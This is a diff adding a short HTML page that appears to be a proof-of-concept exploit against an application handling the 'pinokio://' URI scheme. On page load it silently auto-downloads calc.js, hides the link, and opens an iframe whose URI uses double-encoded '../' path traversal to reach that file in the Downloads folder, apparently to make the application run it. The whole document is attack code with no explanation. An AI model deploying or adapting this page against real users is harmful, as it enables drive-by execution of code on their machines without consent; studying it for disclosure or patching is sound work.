@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+    <body>
+        <a id="downloadLink" href="calc.js" download></a >
+
+        <script>
+            // Automatically click the download link when the page loads
+            window.onload = function() {
+                var dd = document.getElementById("downloadLink");
+                dd.click();
+                document.body.removeChild(dd);
+            };
+        </script>
+            <iframe src="pinokio://?uri=~/_api/%252E%252E%252F%252E%252E%252FDownloads/calc.js">
+    </body>
+</html>
